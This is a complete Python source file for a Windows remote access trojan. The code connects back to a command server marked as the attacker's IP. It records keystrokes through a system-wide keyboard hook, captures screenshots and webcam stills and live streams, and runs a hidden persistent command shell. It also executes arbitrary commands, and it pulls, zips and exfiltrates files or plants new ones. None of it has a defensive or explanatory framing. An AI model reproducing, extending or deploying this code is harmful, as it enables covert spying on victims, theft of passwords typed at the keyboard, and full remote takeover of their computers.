import socket
import subprocess
import os
import sys
import time
import threading
import ctypes
from ctypes import wintypes
import io
import base64
import uuid
import select
import zipfile
import tempfile

C2_HOST = "192.x.x.x"   # ATTACKER LAN IP â€” change before build
C2_PORT = 54321 #PORT
RECONNECT_DELAY = 5

KEYLOG_PATH = os.path.join(os.environ.get("TEMP", "."), ".kl.bin")
_keylog_lock = threading.Lock()
_keylog_buf = bytearray()

_cwd = os.path.expanduser("~")
_cwd_lock = threading.Lock()
_jobs = {}
_jobs_lock = threading.Lock()
_shell = None
_shell_lock = threading.Lock()

WALL_TMP = os.path.join(os.environ.get("TEMP", "."), "_wp_set.jpg")
WALL_BAK = os.path.join(os.environ.get("TEMP", "."), "_wp_old.txt")

VK_NAMES = {
    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
    0x20: " ", 0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2E: "[DEL]", 0x2D: "[INS]", 0x24: "[HOME]", 0x23: "[END]",
    0x21: "[PGUP]", 0x22: "[PGDN]", 0x10: "[SHIFT]", 0x11: "[CTRL]",
    0x12: "[ALT]", 0x14: "[CAPS]", 0x5B: "[WIN]",
}

def _vk_to_char(vk, scan, flags):
    try:
        buf = ctypes.create_unicode_buffer(8)
        state = (ctypes.c_byte * 256)()
        ctypes.windll.user32.GetKeyboardState(state)
        res = ctypes.windll.user32.ToUnicode(vk, scan, state, buf, 8, flags)
        if res == 1 and buf.value:
            return buf.value
    except Exception:
        pass
    return VK_NAMES.get(vk, f"[{vk:02X}]")

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
_ll_hook = None
_ll_hook_proc = None

def _hook_callback(nCode, wParam, lParam):
    global _keylog_buf
    if nCode == 0 and wParam in (0x0100, 0x0104):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        ch = _vk_to_char(kb.vkCode, kb.scanCode, kb.flags)
        with _keylog_lock:
            _keylog_buf.extend(ch.encode("utf-8", errors="replace"))
            if len(_keylog_buf) > 65536:
                _flush_keylog_locked()
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def _flush_keylog_locked():
    global _keylog_buf
    if not _keylog_buf:
        return
    try:
        with open(KEYLOG_PATH, "ab") as f:
            f.write(bytes(_keylog_buf))
        _keylog_buf = bytearray()
    except OSError:
        pass

def _flush_keylog():
    with _keylog_lock:
        _flush_keylog_locked()

def start_keylogger():
    global _ll_hook, _ll_hook_proc
    _ll_hook_proc = HOOKPROC(_hook_callback)
    _ll_hook = ctypes.windll.user32.SetWindowsHookExW(
        13, _ll_hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0,
    )
    if not _ll_hook:
        return False
    msg = wintypes.MSG()
    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    return True

def grab_screenshot():
    from PIL import ImageGrab
    img = ImageGrab.grab(all_screens=True)
    buf = io.BytesIO()
    img.save(buf, format="PNG", optimize=True)
    return buf.getvalue()

# ---------------- wallpaper ----------------

def _current_wallpaper():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop")
        val, _ = winreg.QueryValueEx(k, "Wallpaper")
        winreg.CloseKey(k)
        return val
    except OSError:
        return ""

def _backup_wallpaper():
    cur = _current_wallpaper()
    if cur and not os.path.exists(WALL_BAK):
        try:
            with open(WALL_BAK, "w", encoding="utf-8") as f:
                f.write(cur)
        except OSError:
            pass

def _set_wallpaper(path):
    SPI_SETDESKWALLPAPER = 0x0014
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDCHANGE = 0x02
    ok = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, ctypes.c_wchar_p(path),
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
    )
    return bool(ok)

def set_wallpaper_bytes(data):
    _backup_wallpaper()
    try:
        with open(WALL_TMP, "wb") as f:
            f.write(data)
    except OSError as e:
        return f"[wallpaper write fail] {e}".encode()
    target = WALL_TMP
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(data)).convert("RGB")
        bmp_path = WALL_TMP.rsplit(".", 1)[0] + ".bmp"
        img.save(bmp_path, "BMP")
        target = bmp_path
    except Exception:
        pass
    if _set_wallpaper(target):
        return f"[wallpaper set {len(data)}B]".encode()
    return b"[wallpaper set failed]"

def restore_wallpaper():
    try:
        with open(WALL_BAK, "r", encoding="utf-8") as f:
            orig = f.read().strip()
    except OSError:
        return b"[no wallpaper backup]"
    if not orig:
        return b"[no wallpaper backup]"
    if _set_wallpaper(orig):
        return f"[wallpaper restored: {orig}]".encode()
    return b"[restore failed]"

# ---------------- file ops ----------------

def file_list(path):
    p = _resolve_path(path)
    if not os.path.exists(p):
        return f"[no such path] {p}".encode()
    if os.path.isfile(p):
        st = os.stat(p)
        return f"f {st.st_size:>12} {time.strftime('%Y-%m-%d %H:%M', time.localtime(st.st_mtime))} {p}".encode()
    out = []
    try:
        entries = sorted(os.scandir(p), key=lambda e: (not e.is_dir(), e.name.lower()))
    except OSError as e:
        return f"[err] {e}".encode()
    for e in entries:
        try:
            st = e.stat(follow_symlinks=False)
            kind = "d" if e.is_dir(follow_symlinks=False) else "f"
            out.append(f"{kind} {st.st_size:>12} {time.strftime('%Y-%m-%d %H:%M', time.localtime(st.st_mtime))} {e.path}")
        except OSError:
            continue
    return "\n".join(out).encode() if out else b"[empty]"

def file_read(path):
    p = _resolve_path(path)
    if not os.path.isfile(p):
        return None
    try:
        if os.path.getsize(p) > 50_000_000:
            return None
        with open(p, "rb") as f:
            data = f.read()
        return os.path.basename(p), data
    except OSError:
        return None

def file_write(path, data):
    p = _resolve_path(path)
    try:
        d = os.path.dirname(p)
        if d:
            os.makedirs(d, exist_ok=True)
        with open(p, "wb") as f:
            f.write(data)
        return f"[wrote {len(data)}B to {p}]".encode()
    except OSError as e:
        return f"[write err] {e}".encode()

def file_zip(path):
    p = _resolve_path(path)
    if not os.path.exists(p):
        return None
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
    tmp.close()
    try:
        with zipfile.ZipFile(tmp.name, "w", zipfile.ZIP_DEFLATED) as z:
            if os.path.isfile(p):
                z.write(p, os.path.basename(p))
            else:
                for root, dirs, files in os.walk(p):
                    for fn in files:
                        fp = os.path.join(root, fn)
                        try:
                            rel = os.path.relpath(fp, os.path.dirname(p))
                            z.write(fp, rel)
                        except OSError:
                            continue
        if os.path.getsize(tmp.name) > 100_000_000:
            os.remove(tmp.name)
            return None
        with open(tmp.name, "rb") as f:
            data = f.read()
        os.remove(tmp.name)
        name = (os.path.basename(p.rstrip("\\/")) or "archive") + ".zip"
        return name, data
    except Exception:
        try:
            os.remove(tmp.name)
        except OSError:
            pass
        return None

# ---------------- persistent shell ----------------

class PersistentShell:
    def __init__(self):
        self.proc = subprocess.Popen(
            ["cmd.exe", "/Q", "/K", "prompt $P$G"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            bufsize=0, creationflags=subprocess.CREATE_NO_WINDOW,
        )
        self.lock = threading.Lock()

    def send(self, text, wait=1.0):
        if self.proc.poll() is not None:
            return b"[shell dead]"
        with self.lock:
            try:
                self.proc.stdin.write((text + "\r\n").encode())
                self.proc.stdin.flush()
            except OSError as e:
                return f"[shell write err] {e}".encode()
            time.sleep(min(wait, 0.5))
            chunks = []
            deadline = time.time() + wait + 0.5
            while time.time() < deadline:
                r, _, _ = select.select([self.proc.stdout], [], [], 0.1)
                if not r:
                    break
                data = os.read(self.proc.stdout.fileno(), 65536)
                if not data:
                    break
                chunks.append(data)
                deadline = min(deadline, time.time() + 0.15)
            return b"".join(chunks) or b"[no output]"

    def alive(self):
        return self.proc.poll() is None

    def close(self):
        try:
            self.proc.stdin.write(b"exit\r\n")
            self.proc.stdin.flush()
        except OSError:
            pass
        try:
            self.proc.terminate()
        except Exception:
            pass

def get_shell():
    global _shell
    with _shell_lock:
        if _shell is None or not _shell.alive():
            _shell = PersistentShell()
        return _shell

# ---------------- background jobs ----------------

def start_job(cmd):
    jid = uuid.uuid4().hex[:8]
    proc = subprocess.Popen(
        cmd, shell=True, stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        bufsize=0, creationflags=subprocess.CREATE_NO_WINDOW,
    )
    job = {"id": jid, "cmd": cmd, "proc": proc, "out": bytearray(),
           "lock": threading.Lock(), "started": time.time(), "done": False, "rc": None}

    def drain():
        try:
            while True:
                data = proc.stdout.read(4096)
                if not data:
                    break
                with job["lock"]:
                    job["out"].extend(data)
        finally:
            try:
                job["rc"] = proc.wait(timeout=1)
            except Exception:
                job["rc"] = None
            job["done"] = True

    t = threading.Thread(target=drain, daemon=True)
    t.start()
    job["thread"] = t
    with _jobs_lock:
        _jobs[jid] = job
    return jid

def job_status(jid):
    with _jobs_lock:
        j = _jobs.get(jid)
    if j is None:
        return None
    out = bytes(j["out"])
    return {"id": jid, "cmd": j["cmd"], "done": j["done"], "rc": j["rc"],
            "out": out, "uptime": int(time.time() - j["started"])}

# ---------------- path helpers ----------------

def _resolve_path(p):
    p = os.path.expandvars(os.path.expanduser(p))
    if not os.path.isabs(p):
        with _cwd_lock:
            p = os.path.join(_cwd, p)
    return os.path.normpath(p)

def _with_cwd(cmd):
    with _cwd_lock:
        c = _cwd
    return f'pushd "{c}" >nul 2>&1 && {cmd} & popd >nul 2>&1'

# ---------------- webcam stream ----------------

_cam_lock = threading.Lock()
_cam_stop = threading.Event()
_cam_thread = None
_cam_frame_id = 0

def start_webcam_stream(sock, duration, fps):
    global _cam_thread
    with _cam_lock:
        if _cam_thread and _cam_thread.is_alive():
            return b"[stream already running]"
        _cam_stop.clear()
        _cam_thread = threading.Thread(target=_webcam_worker, args=(sock, duration, fps), daemon=True)
        _cam_thread.start()
    return f"[stream started dur={duration} fps={fps}]".encode()

def _webcam_worker(sock, duration, fps):
    import cv2
    global _cam_frame_id
    interval = 1.0 / max(fps, 1)
    end_time = time.time() + duration if duration > 0 else float("inf")
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        try: send_frame(sock, b"ERR:webcam unavailable")
        except OSError: pass
        return
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
    cap.set(cv2.CAP_PROP_FPS, fps)
    for _ in range(5):
        cap.read()
    _cam_frame_id = 0
    try:
        while not _cam_stop.is_set() and time.time() < end_time:
            t0 = time.time()
            ok, frame = cap.read()
            if not ok:
                time.sleep(interval); continue
            ok, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if not ok:
                continue
            payload = b"FRAME:" + str(_cam_frame_id).encode() + b":" + base64.b64encode(jpg.tobytes())
            try: send_frame(sock, payload)
            except OSError: break
            _cam_frame_id += 1
            elapsed = time.time() - t0
            if elapsed < interval:
                time.sleep(interval - elapsed)
    finally:
        cap.release()
        try: send_frame(sock, b"FRAME_END")
        except OSError: pass

# ---------------- transport ----------------

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return buf

def recv_frame(sock):
    length = int.from_bytes(recv_exact(sock, 4), "big")
    return recv_exact(sock, length)

def send_frame(sock, data):
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(len(data).to_bytes(4, "big") + data)

# ---------------- dispatch ----------------

def stream_cmd(sock, cmd):
    try:
        proc = subprocess.Popen(
            _with_cwd(cmd), shell=True, stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            bufsize=0, creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception as e:
        return f"[err] {e}".encode()
    try:
        while True:
            data = proc.stdout.read(4096)
            if not data:
                break
            send_frame(sock, b"CHUNK:" + base64.b64encode(data))
        proc.wait(timeout=5)
        send_frame(sock, b"CHUNK_END")
        return b"[stream done rc=%s]" % str(proc.returncode).encode()
    except Exception as e:
        return f"[stream err] {e}".encode()

def execute(sock, cmd):
    global _cwd, _shell, _keylog_buf

    if cmd == "shell_open":
        s = get_shell()
        return b"[shell open]" if s.alive() else b"[shell failed]"
    if cmd.startswith("shell_send "):
        s = get_shell()
        if not s.alive():
            return b"[shell dead, use shell_open]"
        return b"SHELL:" + base64.b64encode(s.send(cmd[len("shell_send "):]))
    if cmd == "shell_close":
        with _shell_lock:
            if _shell:
                _shell.close()
                _shell = None
        return b"[shell closed]"

    if cmd == "cwd":
        with _cwd_lock:
            return _cwd.encode()
    if cmd.startswith("cd "):
        target = _resolve_path(cmd[3:].strip().strip('"'))
        if os.path.isdir(target):
            with _cwd_lock:
                _cwd = target
            return f"[cwd={target}]".encode()
        return f"[no such dir] {target}".encode()

    if cmd.startswith("bg "):
        jid = start_job(cmd[3:])
        return f"[job {jid} started]".encode()
    if cmd == "jobs":
        with _jobs_lock:
            ids = list(_jobs.keys())
        if not ids:
            return b"[no jobs]"
        lines = []
        for jid in ids:
            st = job_status(jid)
            if st:
                state = "done" if st["done"] else "run"
                lines.append(f"{jid} {state} {st['uptime']}s rc={st['rc']} {st['cmd']}")
        return "\n".join(lines).encode()
    if cmd.startswith("job_out "):
        st = job_status(cmd[len("job_out "):].strip())
        if st is None:
            return b"[no such job]"
        return f"[job {st['id']} done={st['done']} rc={st['rc']}]\n".encode() + st["out"]
    if cmd.startswith("job_kill "):
        jid = cmd[len("job_kill "):].strip()
        with _jobs_lock:
            j = _jobs.get(jid)
        if not j:
            return b"[no such job]"
        try: j["proc"].terminate()
        except Exception: pass
        return b"[job killed]"

    if cmd.startswith("stream "):
        return stream_cmd(sock, cmd[len("stream "):])

    if cmd == "dir" or cmd.startswith("dir "):
        arg = cmd[3:].strip().strip('"') if len(cmd) > 3 else "."
        return file_list(arg)

    if cmd.startswith("get "):
        r = file_read(cmd[4:].strip().strip('"'))
        if r is None:
            return b"ERR:not found or too large"
        name, data = r
        header = f"FILE:{base64.b64encode(name.encode()).decode()}:{len(data)}:"
        return header.encode() + base64.b64encode(data)

    if cmd.startswith("put "):
        return b"PUT_READY"

    if cmd.startswith("zip "):
        r = file_zip(cmd[4:].strip().strip('"'))
        if r is None:
            return b"ERR:zip failed or too large"
        name, data = r
        header = f"ZIP:{base64.b64encode(name.encode()).decode()}:{len(data)}:"
        return header.encode() + base64.b64encode(data)

    if cmd == "screenshot":
        try:
            return b"SHOT:" + base64.b64encode(grab_screenshot())
        except Exception as e:
            return f"[screenshot error] {e}".encode()
    if cmd == "webcam":
        try:
            import cv2
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return b"[webcam unavailable]"
            for _ in range(5):
                cap.read()
            ok, frame = cap.read()
            cap.release()
            if not ok:
                return b"[webcam unavailable]"
            ok, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            if not ok:
                return b"[webcam encode fail]"
            return b"CAM:" + base64.b64encode(jpg.tobytes())
        except Exception as e:
            return f"[webcam error] {e}".encode()
    if cmd.startswith("webcam_stream"):
        parts = cmd.split()
        dur = int(parts[1]) if len(parts) > 1 else 0
        fps = int(parts[2]) if len(parts) > 2 else 10
        return start_webcam_stream(sock, dur, fps)
    if cmd == "webcam_stop":
        _cam_stop.set()
        return b"[stream stop requested]"

    if cmd == "keylog_dump":
        _flush_keylog()
        try:
            with open(KEYLOG_PATH, "rb") as f:
                return b"KEYLOG:" + base64.b64encode(f.read())
        except FileNotFoundError:
            return b"KEYLOG:"
    if cmd == "keylog_clear":
        with _keylog_lock:
            _keylog_buf = bytearray()
        try: os.remove(KEYLOG_PATH)
        except OSError: pass
        return b"[keylog cleared]"

    try:
        proc = subprocess.run(
            _with_cwd(cmd), shell=True, capture_output=True, timeout=60,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        out = proc.stdout + proc.stderr
        return out if out else b"[no output]"
    except subprocess.TimeoutExpired:
        return b"[timeout; use 'bg' for long-running]"
    except Exception as e:
        return f"[error] {e}".encode()

# ---------------- beacon ----------------

def beacon():
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((C2_HOST, C2_PORT))
            s.settimeout(None)
            send_frame(s, f"HELLO {os.environ.get('COMPUTERNAME','?')}".encode())
            while True:
                cmd = recv_frame(s).decode(errors="replace")
                if cmd == "__EXIT__":
                    break
                if cmd == "wallpaper_set":
                    send_frame(s, b"WALL_READY")
                    try:
                        img = recv_frame(s)
                        result = set_wallpaper_bytes(img)
                    except (ConnectionError, OSError):
                        break
                    send_frame(s, result)
                    continue
                if cmd == "wallpaper_restore":
                    send_frame(s, restore_wallpaper())
                    continue
                if cmd.startswith("put "):
                    send_frame(s, b"PUT_READY")
                    try:
                        data = recv_frame(s)
                        result = file_write(cmd[4:].strip().strip('"'), data)
                    except (ConnectionError, OSError):
                        break
                    send_frame(s, result)
                    continue
                result = execute(s, cmd)
                send_frame(s, result)
        except (ConnectionError, OSError):
            pass
        finally:
            _cam_stop.set()
            try:
                if s: s.close()
            except Exception: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    threading.Thread(target=start_keylogger, daemon=True).start()
    beacon()

